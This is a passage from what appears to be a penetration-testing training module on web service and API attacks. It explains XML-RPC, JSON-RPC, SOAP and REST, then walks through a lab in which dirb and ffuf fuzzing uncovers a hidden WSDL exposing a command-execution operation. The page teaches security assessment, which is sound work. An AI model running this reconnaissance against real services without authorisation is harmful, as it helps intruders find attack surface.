@@ -1,0 +1,1393 @@
+<html><head></head><body>
+  <div class="container">
+<link rel="stylesheet" href="modules\style.css">
+
+
+
+<h1 id="18-web-service-api-attacks">18. Web Service &amp; API Attacks</h1>
+<h2 id="introduction-to-web-services-and-apis">Introduction to Web Services and APIs</h2>
+<hr>
+<p>As described by the World Wide Web Consortium (W3C): <em>Web services provide a standard means of interoperating between different software applications, running on a variety of platforms and/or frameworks. Web services are characterized by their great interoperability and extensibility, as well as their machine-processable descriptions thanks to the use of XML.</em></p>
+<p>Web services enable applications to communicate with each other. The applications can be entirely different. Consider the following scenario:</p>
+<ul>
+<li>One application written in Java is running on a Linux host and is using an Oracle database</li>
+<li>Another application written in C++ is running on a Windows host and is using an SQL Server database</li>
+</ul>
+<p>These two applications can communicate with each other over the internet with the help of web services.</p>
+<p>An application programming interface (API) is a set of rules that enables data transmission between different software. The technical specification of each API dictates the data exchange.</p>
+<p>Consider the following example: A piece of software needs to access information, such as ticket prices for specific dates. To obtain the required information, it will make a call to the API of another software (including how data/functionality must be returned). The other software will return any data/functionality requested.</p>
+<p>The interface through which these two pieces of software exchanged data is what the API specifies.</p>
+<p>You may think Web Services and APIs are quite similar, and you will be correct. See their major differences below.</p>
+<h3 id="web-service-vs-api">Web Service vs. API</h3>
+<hr>
+<p>The terms <code>web service</code> and <code>application programming interface (API)</code> should not be used interchangeably in every case.</p>
+<ul>
+<li>Web services are a type of application programming interface (API). The opposite is not always true!</li>
+<li>Web services need a network to achieve their objective. APIs can achieve their goal even offline.</li>
+<li>Web services rarely allow external developer access, and there are a lot of APIs that welcome external developer tinkering.</li>
+<li>Web services usually utilize SOAP for security reasons. APIs can be found using different designs, such as XML-RPC, JSON-RPC, SOAP, and REST.</li>
+<li>Web services usually utilize the XML format for data encoding. APIs can be found using different formats to store data, with the most popular being JavaScript Object Notation (JSON).</li>
+</ul>
+<h3 id="web-service-approaches-technologies">Web Service Approaches/Technologies</h3>
+<hr>
+<p>There are multiple approaches/technologies for providing and consuming web services:</p>
+<ul>
+<li><p><code>XML-RPC</code></p>
+<ul>
+<li><a href="http://xmlrpc.com/spec.md">XML-RPC</a> uses XML for encoding/decoding the remote procedure call (RPC) and the respective parameter(s). HTTP is usually the transport of choice.</li>
+<li><p>Code: http</p>
+<pre><code class="lang-http"><span class="xml">  --&gt; POST /RPC2 HTTP/1.0
+  User-Agent: Frontier/5.1.2 (WinNT)
+  Host: betty.userland.com
+  Content-Type: text/xml
+  Content-length: 181
+
+  <span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span><span class="hljs-meta">?&gt;</span></span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">methodCall</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">methodName</span>&gt;</span>examples.getStateName<span class="hljs-tag">&lt;/<span class="hljs-name">methodName</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">params</span>&gt;</span>
+       <span class="hljs-tag">&lt;<span class="hljs-name">param</span>&gt;</span>
+              <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">i4</span>&gt;</span>41<span class="hljs-tag">&lt;/<span class="hljs-name">i4</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+              <span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span>
+          <span class="hljs-tag">&lt;/<span class="hljs-name">params</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">methodCall</span>&gt;</span>
+
+  <span class="hljs-tag">&lt;<span class="hljs-name">--</span> <span class="hljs-attr">HTTP</span>/<span class="hljs-attr">1.1</span> <span class="hljs-attr">200</span> <span class="hljs-attr">OK</span>
+  <span class="hljs-attr">Connection:</span> <span class="hljs-attr">close</span>
+  <span class="hljs-attr">Content-Length:</span> <span class="hljs-attr">158</span>
+  <span class="hljs-attr">Content-Type:</span> <span class="hljs-attr">text</span>/<span class="hljs-attr">xml</span>
+  <span class="hljs-attr">Date:</span> <span class="hljs-attr">Fri</span>, <span class="hljs-attr">17</span> <span class="hljs-attr">Jul</span> <span class="hljs-attr">1998</span> <span class="hljs-attr">19:55:08</span> <span class="hljs-attr">GMT</span>
+  <span class="hljs-attr">Server:</span> <span class="hljs-attr">UserLand</span> <span class="hljs-attr">Frontier</span>/<span class="hljs-attr">5.1.2-WinNT</span>
+
+  &lt;?<span class="hljs-attr">xml</span> <span class="hljs-attr">version</span>=<span class="hljs-string">"1.0"</span>?&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">methodResponse</span>&gt;</span>
+     <span class="hljs-tag">&lt;<span class="hljs-name">params</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">param</span>&gt;</span>
+              <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>South Dakota<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+              <span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span>
+          <span class="hljs-tag">&lt;/<span class="hljs-name">params</span>&gt;</span>
+   <span class="hljs-tag">&lt;/<span class="hljs-name">methodResponse</span>&gt;</span></span>
+</code></pre>
+</li>
+</ul>
+<p>The payload in XML is essentially a single <code>&lt;methodCall&gt;</code> structure. <code>&lt;methodCall&gt;</code> should contain a <code>&lt;methodName&gt;</code> sub-item, that is related to the method to be called. If the call requires parameters, then <code>&lt;methodCall&gt;</code> must contain a <code>&lt;params&gt;</code> sub-item.</p>
+</li>
+<li><p><code>JSON-RPC</code></p>
+<ul>
+<li><a href="https://www.jsonrpc.org/specification">JSON-RPC</a> uses JSON to invoke functionality. HTTP is usually the transport of choice.</li>
+<li><p>Code: http</p>
+<pre><code class="lang-http">  --&gt; POST /ENDPOINT HTTP/<span class="hljs-number">1.1</span>
+   Host: ...
+   Content-Type: application/json-rpc
+   Content-Length: ...
+
+  {<span class="hljs-string">"method"</span>: <span class="hljs-string">"sum"</span>, <span class="hljs-string">"params"</span>: {<span class="hljs-string">"a"</span>:<span class="hljs-number">3</span>, <span class="hljs-string">"b"</span>:<span class="hljs-number">4</span>}, <span class="hljs-string">"id"</span>:<span class="hljs-number">0</span>}
+
+  &lt;-- HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK
+   ...
+   Content-Type: application/json-rpc
+
+   {<span class="hljs-string">"result"</span>: <span class="hljs-number">7</span>, <span class="hljs-string">"error"</span>: null, <span class="hljs-string">"id"</span>: <span class="hljs-number">0</span>}
+</code></pre>
+</li>
+</ul>
+<p>The <code>{"method": "sum", "params": {"a":3, "b":4}, "id":0}</code> object is serialized using JSON. Note the three properties: <code>method</code>, <code>params</code> and <code>id</code>. <code>method</code> contains the name of the method to invoke. <code>params</code> contains an array carrying the arguments to be passed. <code>id</code> contains an identifier established by the client. The server must reply with the same value in the response object if included.</p>
+</li>
+<li><p><code>SOAP (Simple Object Access Protocol)</code></p>
+<ul>
+<li>SOAP also uses XML but provides more functionalities than XML-RPC. SOAP defines both a header structure and a payload structure. The former identifies the actions that SOAP nodes are expected to take on the message, while the latter deals with the carried information. A Web Services Definition Language (WSDL) declaration is optional. WSDL specifies how a SOAP service can be used. Various lower-level protocols (HTTP included) can be the transport.</li>
+<li>Anatomy of a SOAP Message<ul>
+<li><code>soap:Envelope</code>: (Required block) Tag to differentiate SOAP from normal XML. This tag requires a <code>namespace</code> attribute.</li>
+<li><code>soap:Header</code>: (Optional block) Enables SOAP’s extensibility through SOAP modules.</li>
+<li><code>soap:Body</code>: (Required block) Contains the procedure, parameters, and data.</li>
+<li><code>soap:Fault</code>: (Optional block) Used within <code>soap:Body</code> for error messages upon a failed API call.</li>
+</ul>
+</li>
+<li><p>Code: http</p>
+<pre><code class="lang-http"><span class="xml">  --&gt; POST /Quotation HTTP/1.0
+  Host: www.xyz.org
+  Content-Type: text/xml; charset = utf-8
+  Content-Length: nnn
+
+  <span class="php"><span class="hljs-meta">&lt;?</span>xml version = <span class="hljs-string">"1.0"</span><span class="hljs-meta">?&gt;</span></span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">SOAP-ENV:Envelope</span>
+    <span class="hljs-attr">xmlns:SOAP-ENV</span> = <span class="hljs-string">"http://www.w3.org/2001/12/soap-envelope"</span>
+     <span class="hljs-attr">SOAP-ENV:encodingStyle</span> = <span class="hljs-string">"http://www.w3.org/2001/12/soap-encoding"</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;<span class="hljs-name">SOAP-ENV:Body</span> <span class="hljs-attr">xmlns:m</span> = <span class="hljs-string">"http://www.xyz.org/quotations"</span>&gt;</span>
+       <span class="hljs-tag">&lt;<span class="hljs-name">m:GetQuotation</span>&gt;</span>
+         <span class="hljs-tag">&lt;<span class="hljs-name">m:QuotationsName</span>&gt;</span>MiscroSoft<span class="hljs-tag">&lt;/<span class="hljs-name">m:QuotationsName</span>&gt;</span>
+      <span class="hljs-tag">&lt;/<span class="hljs-name">m:GetQuotation</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">SOAP-ENV:Body</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">SOAP-ENV:Envelope</span>&gt;</span>
+
+  <span class="hljs-tag">&lt;<span class="hljs-name">--</span> <span class="hljs-attr">HTTP</span>/<span class="hljs-attr">1.0</span> <span class="hljs-attr">200</span> <span class="hljs-attr">OK</span>
+  <span class="hljs-attr">Content-Type:</span> <span class="hljs-attr">text</span>/<span class="hljs-attr">xml</span>; <span class="hljs-attr">charset</span> = <span class="hljs-string">utf-8</span>
+  <span class="hljs-attr">Content-Length:</span> <span class="hljs-attr">nnn</span>
+
+  &lt;?<span class="hljs-attr">xml</span> <span class="hljs-attr">version</span> = <span class="hljs-string">"1.0"</span>?&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">SOAP-ENV:Envelope</span>
+   <span class="hljs-attr">xmlns:SOAP-ENV</span> = <span class="hljs-string">"http://www.w3.org/2001/12/soap-envelope"</span>
+    <span class="hljs-attr">SOAP-ENV:encodingStyle</span> = <span class="hljs-string">"http://www.w3.org/2001/12/soap-encoding"</span>&gt;</span>
+
+  <span class="hljs-tag">&lt;<span class="hljs-name">SOAP-ENV:Body</span> <span class="hljs-attr">xmlns:m</span> = <span class="hljs-string">"http://www.xyz.org/quotation"</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">m:GetQuotationResponse</span>&gt;</span>
+           <span class="hljs-tag">&lt;<span class="hljs-name">m:Quotation</span>&gt;</span>Here is the quotation<span class="hljs-tag">&lt;/<span class="hljs-name">m:Quotation</span>&gt;</span>
+     <span class="hljs-tag">&lt;/<span class="hljs-name">m:GetQuotationResponse</span>&gt;</span>
+   <span class="hljs-tag">&lt;/<span class="hljs-name">SOAP-ENV:Body</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">SOAP-ENV:Envelope</span>&gt;</span></span>
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>Note</strong>: You may come across slightly different SOAP envelopes. Their anatomy will be the same, though.</p>
+<ul>
+<li><code>WS-BPEL (Web Services Business Process Execution Language)</code><ul>
+<li>WS-BPEL web services are essentially SOAP web services with more functionality for describing and invoking business processes.</li>
+<li>WS-BPEL web services heavily resemble SOAP services. For this reason, they will not be included in this module's scope.</li>
+</ul>
+</li>
+<li><p><code>RESTful (Representational State Transfer)</code></p>
+<ul>
+<li>REST web services usually use XML or JSON. WSDL declarations are supported but uncommon. HTTP is the transport of choice, and HTTP verbs are used to access/change/delete resources and use data.</li>
+</ul>
+<pre><code class="lang-http">  --&gt; POST /api/2.2/auth/signin HTTP/1.1
+  HOST: my-server
+  Content-Type:text/xml
+
+  <span class="hljs-tag">&lt;<span class="hljs-name">tsRequest</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">credentials</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"administrator"</span> <span class="hljs-attr">password</span>=<span class="hljs-string">"passw0rd"</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">site</span> <span class="hljs-attr">contentUrl</span>=<span class="hljs-string">""</span> /&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">credentials</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">tsRequest</span>&gt;</span>
+</code></pre>
+<pre><code class="lang-http">  <span class="hljs-comment">--&gt; POST /api/2.2/auth/signin HTTP/1.1</span>
+  HOST: <span class="hljs-keyword">my</span>-server
+  Content-Type:<span class="hljs-built_in">application</span>/json
+  Accept:<span class="hljs-built_in">application</span>/json
+
+  {
+   <span class="hljs-string">"credentials"</span>: {
+     <span class="hljs-string">"name"</span>: <span class="hljs-string">"administrator"</span>,
+    <span class="hljs-string">"password"</span>: <span class="hljs-string">"passw0rd"</span>,
+    <span class="hljs-string">"site"</span>: {
+      <span class="hljs-string">"contentUrl"</span>: <span class="hljs-string">""</span>
+     }
+    }
+  }
+</code></pre>
+</li>
+</ul>
+<hr>
+<p>Similar API specifications/protocols exist, such as Remote Procedure Call (RPC), SOAP, REST, gRPC, GraphQL, etc.</p>
+<p>Do not feel overwhelmed! In the following sections, you will have the opportunity to interact with different web services and APIs.</p>
+<h2 id="web-services-description-language-wsdl-">Web Services Description Language (WSDL)</h2>
+<hr>
+<p>WSDL stands for Web Service Description Language. WSDL is an XML-based file exposed by web services that informs clients of the provided services/methods, including where they reside and the method-calling convention.</p>
+<p>A web service's WSDL file should not always be accessible. Developers may not want to publicly expose a web service's WSDL file, or they may expose it through an uncommon location, following a security through obscurity approach. In the latter case, directory/parameter fuzzing may reveal the location and content of a WSDL file.</p>
+<p>Proceed to the end of this section and click on <code>Click here to spawn the target system!</code> or the <code>Reset Target</code> icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target service and follow along.</p>
+<p>Suppose we are assessing a SOAP service residing in <code>http://&lt;TARGET IP&gt;:3002</code>. We have not been informed of a WSDL file.</p>
+<p>Let us start by performing basic directory fuzzing against the web service.</p>
+<p>Web Services Description Language (WSDL)</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ dirb http://&lt;TARGET IP&gt;:3002
+
+<span class="hljs-code">-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------</span>
+
+START<span class="hljs-emphasis">_TIME: Fri Mar 25 11:53:09 2022
+URL_</span>BASE: http://&lt;TARGET IP&gt;:3002/
+WORDLIST<span class="hljs-emphasis">_FILES: /usr/share/dirb/wordlists/common.txt
+
+</span><span class="hljs-code">-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://&lt;TARGET IP&gt;:3002/ ----
++ http://&lt;TARGET IP&gt;:3002/wsdl (CODE:200|SIZE:0)                            
+
+-----------------</span>
+END<span class="hljs-emphasis">_TIME: Fri Mar 25 11:53:24 2022
+DOWNLOADED: 4612 - FOUND: 1</span>
+</code></pre>
+<p>It looks like <code>http://&lt;TARGET IP&gt;:3002/wsdl</code> exists. Let us inspect its content as follows.</p>
+<p>Web Services Description Language (WSDL)</p>
+<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ curl http:/</span><span class="hljs-regexp">/&lt;TARGET IP&gt;:3002/wsdl</span>
+</code></pre>
+<p>The response is empty! Maybe there is a parameter that will provide us with access to the SOAP web service's WSDL file. Let us perform parameter fuzzing using <em>ffuf</em> and the <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt">burp-parameter-names.txt</a> list, as follows. <em>-fs 0</em> filters out empty responses (size = 0) and <em>-mc 200</em> matches <em>HTTP 200</em> responses.</p>
+<p>Web Services Description Language (WSDL)</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ ffuf -w "/</span>home<span class="hljs-regexp">/htb-acxxxxx/</span>Desktop<span class="hljs-regexp">/Useful Repos/</span>SecLists<span class="hljs-regexp">/Discovery/</span>Web-Content<span class="hljs-regexp">/burp-parameter-names.txt" -u 'http:/</span><span class="hljs-regexp">/&lt;TARGET IP&gt;:3002/</span>wsdl?FUZZ' -fs 0 -mc 200
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: <span class="hljs-string">Method           :</span> GET
+ :: <span class="hljs-string">URL              :</span> <span class="hljs-string">http:</span><span class="hljs-comment">//&lt;TARGET IP&gt;:3002/wsdl?FUZZ</span>
+ :: <span class="hljs-string">Wordlist         :</span> <span class="hljs-string">FUZZ:</span> <span class="hljs-regexp">/home/</span>htb-acxxxxx<span class="hljs-regexp">/Desktop/</span>Useful Repos<span class="hljs-regexp">/SecLists/</span>Discovery<span class="hljs-regexp">/Web-Content/</span>burp-parameter-names.txt
+ :: Follow <span class="hljs-string">redirects :</span> <span class="hljs-literal">false</span>
+ :: <span class="hljs-string">Calibration      :</span> <span class="hljs-literal">false</span>
+ :: <span class="hljs-string">Timeout          :</span> <span class="hljs-number">10</span>
+ :: <span class="hljs-string">Threads          :</span> <span class="hljs-number">40</span>
+ :: <span class="hljs-string">Matcher          :</span> Response <span class="hljs-string">status:</span> <span class="hljs-number">200</span>
+ :: <span class="hljs-string">Filter           :</span> Response <span class="hljs-string">size:</span> <span class="hljs-number">0</span>
+________________________________________________
+
+:: <span class="hljs-string">Progress:</span> [<span class="hljs-number">40</span><span class="hljs-regexp">/2588] :: Job [1/</span><span class="hljs-number">1</span>] :: <span class="hljs-number">0</span> req/<span class="hljs-string">sec :</span>: <span class="hljs-string">Duration:</span> [<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>] :: Error
+:: <span class="hljs-string">Progress:</span> [<span class="hljs-number">537</span><span class="hljs-regexp">/2588] :: Job [1/</span><span class="hljs-number">1</span>] :: <span class="hljs-number">0</span> req/<span class="hljs-string">sec :</span>: <span class="hljs-string">Duration:</span> [<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>] :: Erro
+wsdl [<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-string">Size:</span> <span class="hljs-number">4461</span>, <span class="hljs-string">Words:</span> <span class="hljs-number">967</span>, <span class="hljs-string">Lines:</span> <span class="hljs-number">186</span>]
+:: <span class="hljs-string">Progress:</span> [<span class="hljs-number">982</span><span class="hljs-regexp">/2588] :: Job [1/</span><span class="hljs-number">1</span>] :: <span class="hljs-number">0</span> req/<span class="hljs-string">sec :</span>: <span class="hljs-string">Duration:</span> [<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>] :: <span class="hljs-string">Erro:</span>: 
+<span class="hljs-string">Progress:</span> [<span class="hljs-number">1153</span><span class="hljs-regexp">/2588] :: Job [1/</span><span class="hljs-number">1</span>] :: <span class="hljs-number">0</span> req/<span class="hljs-string">sec :</span>: <span class="hljs-string">Duration:</span> [<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>] :: <span class="hljs-string">Err:</span>:
+<span class="hljs-string">Progress:</span> [<span class="hljs-number">1780</span><span class="hljs-regexp">/2588] :: Job [1/</span><span class="hljs-number">1</span>] :: <span class="hljs-number">0</span> req/<span class="hljs-string">sec :</span>: <span class="hljs-string">Duration:</span> [<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>] :: <span class="hljs-string">Err:</span>: 
+<span class="hljs-string">Progress:</span> [<span class="hljs-number">2461</span><span class="hljs-regexp">/2588] :: Job [1/</span><span class="hljs-number">1</span>] :: <span class="hljs-number">0</span> req/<span class="hljs-string">sec :</span>: <span class="hljs-string">Duration:</span> [<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>] :: <span class="hljs-string">Err:</span>: 
+<span class="hljs-string">Progress:</span> [<span class="hljs-number">2588</span><span class="hljs-regexp">/2588] :: Job [1/</span><span class="hljs-number">1</span>] :: <span class="hljs-number">0</span> req/<span class="hljs-string">sec :</span>: <span class="hljs-string">Duration:</span> [<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>] :: <span class="hljs-string">Err:</span>: 
+<span class="hljs-string">Progress:</span> [<span class="hljs-number">2588</span><span class="hljs-regexp">/2588] :: Job [1/</span><span class="hljs-number">1</span>] :: <span class="hljs-number">0</span> req/<span class="hljs-string">sec :</span>: <span class="hljs-string">Duration:</span> [<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>] :: <span class="hljs-string">Errors:</span> <span class="hljs-number">0</span> ::
+</code></pre>
+<p>It looks like <em>wsdl</em> is a valid parameter. Let us now issue a request for <code>http://&lt;TARGET IP&gt;:3002/wsdl?wsdl</code></p>
+<p>Web Services Description Language (WSDL)</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ curl http://<span class="hljs-tag">&lt;<span class="hljs-name">TARGET</span> <span class="hljs-attr">IP</span>&gt;</span>:3002/wsdl?wsdl 
+
+<span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-tag">&lt;<span class="hljs-name">wsdl:definitions</span> <span class="hljs-attr">targetNamespace</span>=<span class="hljs-string">"http://tempuri.org/"</span>
+    <span class="hljs-attr">xmlns:s</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema"</span>
+    <span class="hljs-attr">xmlns:soap12</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/wsdl/soap12/"</span>
+    <span class="hljs-attr">xmlns:http</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/wsdl/http/"</span>
+    <span class="hljs-attr">xmlns:mime</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/wsdl/mime/"</span>
+    <span class="hljs-attr">xmlns:tns</span>=<span class="hljs-string">"http://tempuri.org/"</span>
+    <span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/wsdl/soap/"</span>
+    <span class="hljs-attr">xmlns:tm</span>=<span class="hljs-string">"http://microsoft.com/wsdl/mime/textMatching/"</span>
+    <span class="hljs-attr">xmlns:soapenc</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/encoding/"</span>
+    <span class="hljs-attr">xmlns:wsdl</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/wsdl/"</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:types</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">s:schema</span> <span class="hljs-attr">elementFormDefault</span>=<span class="hljs-string">"qualified"</span> <span class="hljs-attr">targetNamespace</span>=<span class="hljs-string">"http://tempuri.org/"</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">s:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"LoginRequest"</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">s:complexType</span>&gt;</span>
+                    <span class="hljs-tag">&lt;<span class="hljs-name">s:sequence</span>&gt;</span>
+                        <span class="hljs-tag">&lt;<span class="hljs-name">s:element</span> <span class="hljs-attr">minOccurs</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">maxOccurs</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"username"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"s:string"</span>/&gt;</span>
+                        <span class="hljs-tag">&lt;<span class="hljs-name">s:element</span> <span class="hljs-attr">minOccurs</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">maxOccurs</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"s:string"</span>/&gt;</span>
+                    <span class="hljs-tag">&lt;/<span class="hljs-name">s:sequence</span>&gt;</span>
+                <span class="hljs-tag">&lt;/<span class="hljs-name">s:complexType</span>&gt;</span>
+            <span class="hljs-tag">&lt;/<span class="hljs-name">s:element</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">s:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"LoginResponse"</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">s:complexType</span>&gt;</span>
+                    <span class="hljs-tag">&lt;<span class="hljs-name">s:sequence</span>&gt;</span>
+                        <span class="hljs-tag">&lt;<span class="hljs-name">s:element</span> <span class="hljs-attr">minOccurs</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">maxOccurs</span>=<span class="hljs-string">"unbounded"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"result"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"s:string"</span>/&gt;</span>
+                    <span class="hljs-tag">&lt;/<span class="hljs-name">s:sequence</span>&gt;</span>
+                <span class="hljs-tag">&lt;/<span class="hljs-name">s:complexType</span>&gt;</span>
+            <span class="hljs-tag">&lt;/<span class="hljs-name">s:element</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">s:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"ExecuteCommandRequest"</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">s:complexType</span>&gt;</span>
+                    <span class="hljs-tag">&lt;<span class="hljs-name">s:sequence</span>&gt;</span>
+                        <span class="hljs-tag">&lt;<span class="hljs-name">s:element</span> <span class="hljs-attr">minOccurs</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">maxOccurs</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"cmd"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"s:string"</span>/&gt;</span>
+                    <span class="hljs-tag">&lt;/<span class="hljs-name">s:sequence</span>&gt;</span>
+                <span class="hljs-tag">&lt;/<span class="hljs-name">s:complexType</span>&gt;</span>
+            <span class="hljs-tag">&lt;/<span class="hljs-name">s:element</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">s:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"ExecuteCommandResponse"</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">s:complexType</span>&gt;</span>
+                    <span class="hljs-tag">&lt;<span class="hljs-name">s:sequence</span>&gt;</span>
+                        <span class="hljs-tag">&lt;<span class="hljs-name">s:element</span> <span class="hljs-attr">minOccurs</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">maxOccurs</span>=<span class="hljs-string">"unbounded"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"result"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"s:string"</span>/&gt;</span>
+                    <span class="hljs-tag">&lt;/<span class="hljs-name">s:sequence</span>&gt;</span>
+                <span class="hljs-tag">&lt;/<span class="hljs-name">s:complexType</span>&gt;</span>
+            <span class="hljs-tag">&lt;/<span class="hljs-name">s:element</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">s:schema</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:types</span>&gt;</span>
+    <span class="hljs-comment">&lt;!-- Login Messages --&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:message</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"LoginSoapIn"</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:part</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"parameters"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">"tns:LoginRequest"</span>/&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:message</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:message</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"LoginSoapOut"</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:part</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"parameters"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">"tns:LoginResponse"</span>/&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:message</span>&gt;</span>
+    <span class="hljs-comment">&lt;!-- ExecuteCommand Messages --&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:message</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"ExecuteCommandSoapIn"</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:part</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"parameters"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">"tns:ExecuteCommandRequest"</span>/&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:message</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:message</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"ExecuteCommandSoapOut"</span>&gt;</span>
